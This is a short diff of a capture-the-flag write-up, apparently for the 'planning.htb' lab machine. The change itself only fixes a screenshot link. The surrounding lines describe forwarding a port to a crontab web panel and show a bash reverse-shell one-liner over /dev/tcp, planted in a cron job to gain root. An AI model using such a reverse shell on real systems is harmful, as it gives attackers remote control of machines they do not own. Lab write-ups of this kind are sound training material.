@@ -59,7 +59,7 @@
   ssh 8000:localhosts:8000 enzo@planning.htb
   ```
 - Found a webpage that hosts crontab
-  [](./screenshots/crontab_web.png)
+  ![](./screenshots/crontab_web.png)
 - Inserted a malicious code that connects to my machine using netcat to gain root shell
   ```bash
   /bin/bash -i >& /dev/tcp/<your ip>/<your port> 0>&1
